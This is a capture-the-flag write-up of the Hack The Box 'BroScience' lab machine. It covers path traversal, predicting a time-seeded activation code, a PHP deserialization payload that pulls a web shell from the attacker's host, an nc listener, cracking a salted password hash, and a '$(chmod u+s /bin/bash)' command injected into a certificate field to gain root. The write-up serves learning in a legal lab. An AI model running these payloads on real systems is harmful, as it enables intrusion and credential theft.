---
layout: post
author: H4-L0
---

# HTB-BroScience

![image](/images/Pasted image 20230312210242.png)

[BroScience Box](https://app.hackthebox.com/machines/BroScience)

## Enumeration

first checking for open ports with nmap.

### nmap

```shell
$ nmap -sV broscience.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-12 16:00 EDT
Nmap scan report for broscience.htb (10.10.11.195)
Host is up (0.033s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.54
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
```

we found 3 open ports:

- `22` ssh-service
- `80` apache webserver
- `443` apache webserver (ssl)

### website

![image](/images/Pasted image 20230312210428.png)

the website is some kind of exercise blog. the interesting part is the login page but no sign for SQL Injection vulnerability.

![image](/images/Pasted image 20230312210532.png)

we checked if we could create an account. it was possible.

![image](/images/Pasted image 20230312211320.png)

but after trying to log in we needed to get the account activated. normally via email verification code but we need to find another way.

![image](/images/Pasted image 20230312211233.png)


### dirbusting

scanning for files and directories got us something to go through.

```shell
$ ffuf -w `fzf-wordlist` -u https://broscience.htb/FUZZ -e ".php"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://broscience.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Extensions       : .php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.hta.php                [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 34ms]
.htpasswd.php           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 34ms]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 32ms]
.php                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 33ms]
                        [Status: 200, Size: 171481, Words: 78373, Lines: 2547, Duration: 60ms]
.hta                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 37ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 34ms]
.htaccess.php           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 34ms]
activate.php            [Status: 200, Size: 1256, Words: 293, Lines: 28, Duration: 34ms]
comment.php             [Status: 302, Size: 13, Words: 3, Lines: 1, Duration: 36ms]
images                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 238ms]
includes                [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 41ms]
index.php               [Status: 200, Size: 171481, Words: 78373, Lines: 2547, Duration: 409ms]
index.php               [Status: 200, Size: 171481, Words: 78373, Lines: 2547, Duration: 656ms]
javascript              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 38ms]
login.php               [Status: 200, Size: 1936, Words: 567, Lines: 42, Duration: 242ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
manual                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 38ms]
register.php            [Status: 200, Size: 2161, Words: 635, Lines: 45, Duration: 40ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 35ms]
styles                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 41ms]
user.php                [Status: 200, Size: 1309, Words: 300, Lines: 29, Duration: 38ms]
:: Progress: [9228/9228] :: Job [1/1] :: 199 req/sec :: Duration: [0:01:03] :: Errors: 0 ::

```

we got a error message when we wanted to access `/includes/img.php`

![image](/images/Pasted image 20230312210918.png)

it is missing the path parameter, so we provided one and tried to read local files.

```shell
https://broscience.htb/includes/img.php?path=../../../../etc/passwd
```

![image](/images/Pasted image 20230216210513.png)

we could read `etc/passwd` with path traversel with double url-encoding.

now we were able to read the content of all php files we found via dirbusting.

in the `register.php` we got a line where the activation code got generated. the function `genereate_activation_code` got included from `utils.php`.

*register.php*

```php
...
if (pg_num_rows($res) == 0) {
	// Create the account
    include_once 'includes/utils.php';
    $activation_code = generate_activation_code();
...
```

*utils.php*

the code gets build by a loop that iterates 32 times and with every iteration a random character gets choosen from the string `$chars`. 
the interesting part is `srand(time())`
the seed is taken from the current time the request is made.
to generate the exact same activation code we need to monitor our registration of a new account and grab the response time of the server. using this time as seed for our function should get us the correct code.

```php
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

```

we changed `srand(time())` to:

```php
$response_time = strtotime("Sun, 12 Mar 2023 20:55:43 GMT");
srand($response_time);
```

and checking `activate.php` we know the script is expecting `code` as parameter.

*activate.php*

```php
<?php
session_start();

// Check if user is logged in already
if (isset($_SESSION['id'])) {
    header('Location: /index.php');
}

if (isset($_GET['code'])) {
    // Check if code is formatted correctly (regex)
...
```

and it worked.

![image](/images/Pasted image 20230312215730.png)

we also got another file with database credentials that might be useful later.

*db_connect.php*

```php
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>
```

after logging in we see our member page but nothing more.

![image](/images/Pasted image 20230314214050.png)

we checked the request we are making to get the `user.php` and see some base64 encoded cookies.

![image](/images/Pasted image 20230314214034.png)

the decoded string looks like this:

```shell
O:9:"UserPrefs":1:{s:5:"theme";s:5:"light";}
```

a *serialized object*

as with the other pages we looked at the source of `user.php` and found that a function from `utils.php` got called to unserialize the cookie.

to take advantage of this we need to use objects that are already declared. the avatar feature was not implemented, but Objects are already in the source. And these objects need a file and a file path to save to.

```php
function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }
    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
?>
```

we created this php snippet that points to a php shell file on our machine, that is hosted with an simple python server. `python3 -m http.server 80`.

and it should be saved in the includes folder, so we can easily check if everything worked properly.

```php
<?php
function print_object() {
		$tmp = "http://10.10.15.41/shelljojo2.php";
        $imgPath = "/var/www/html/includes/shelljojo2.php";
        $p = new AvatarInterface();
        $p->tmp=$tmp;
        $p->imgPath=$imgPath;

   echo base64_encode(serialize($p));
}

class AvatarInterface {
    public $tmp;
    public $imgPath;
}

print_object();
?>
```

executing the script gives us the base64 encoded serialized php object.

```shell
$ php -f gen_cookie.php
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czozMzoiaHR0cDovLzEwLjEwLjE1LjQxL3NoZWxsam9qbzIucGhwIjtzOjc6ImltZ1BhdGgiO3M6Mzc6Ii92YXIvd3d3L2h0bWwvaW5jbHVkZXMvc2hlbGxqb2pvMi5waHAiO30=
```

with burp we replaced the cookie and send the request.

![image](/images/Pasted image 20230313223604.png)

after checking the includes listening we found our file.

![image](/images/Pasted image 20230313222926.png)

before we can execute it we need to setup a listener on our side.

```shell
nc -lvnp 4444
```

and we have the shell.

![image](/images/Pasted image 20230313223710.png)

after poking around we used `linpeas.sh` to check for attack vectors. from the php script `db_connect.php` we know some database credentials and with linpeas we got the answer that a `postgresql` database is running. and we have access to `psql`.

to access the database we used the credentials in the php file.

```shell
$ psql -h localhost -U dbuser -d broscience
```

in the table *users* we found password hashes and usernames. from our read from `/etc/passwd` we know only one user has shell access.

```shell
bill | 13edad4932da9dbb57d9cd15b66ed104                         
```

know we need to crack the password hash. after a few fails we did not so at first glance that we were missing the salt added to the password hash. luckily it is also presented in the `db_connect.php` script. with that knowledge we were able to crack the hash with hashcat.

```hash with salt
13edad4932da9dbb57d9cd15b66ed104.NaCl
```

```shell
$ hashcat -m 10 -a 0 bill_hash.txt /usr/share/wordlists/rockyou.txt
```

and we got the password.

```shell
13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
```

```shell
$ ssh bill@brosience
...
bill@broscience:~$ id
uid=1000(bill) gid=1000(bill) groups=1000(bill)
```

*user flag*
```shell
bill@broscience:~$ cat user.txt
5b***************************309
```

we found a unusual script in `/opt/renew_cert.sh`
the script belongs to root.  the script needs as input a `crt` certificate. it checks if the cert is less than a day valid and if not it generates a new certificate with the same input variables.


the interesting part is where the script moves the new script from temp to the homefolder of bill and renames the cert after the commonName variable.

```shell
...
 /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
...
```

to exploit this we need to generate a script that is valid for less than a day. we struggled a bit with the correct name of the cert but in the end `broscience.crt` worked just fine.

```shell
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out ~/Certs/broscience.crt -days 1
```

after this command we need to answer a few questions regarding the ownership of the cert. and here we need to put our malicious code into the common name question.

we create suid bit on `/bin/bash` so we can execute it afterwards as root.

```shell
Country Name (2 letter code) [AU]:AU
State or Province Name (full name) [Some-State]:somestate
Locality Name (eg, city) []:asd
Organization Name (eg, company) [Internet Widgits Pty Ltd]:ste
Organizational Unit Name (eg, section) []:asf
Common Name (e.g. server FQDN or YOUR name) []:$(chmod u+s /bin/bash)
Email Address []:test@sda.com
```

after  checking that the binary has the suid bit set.

```shell
bill@broscience:~/Certs$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

we spawn just another shell as root.

```shell
$ /bin/bash -p
```

we are root and looked at first into the root directory. this is how the `renew_cert.sh` gets executed.

```shell
bash-5.1# cat cron.sh
#!/bin/bash
timeout 10 /bin/bash -c '/opt/renew_cert.sh /home/bill/Certs/broscience.crt'
/usr/bin/rm -r /home/bill/Certs/*
/usr/bin/rm -r /home/bill/Certs/.*
```

and here is finally the root flag.

![image](/images/Pasted image 20230316101623.png)

[H4] & [L0]
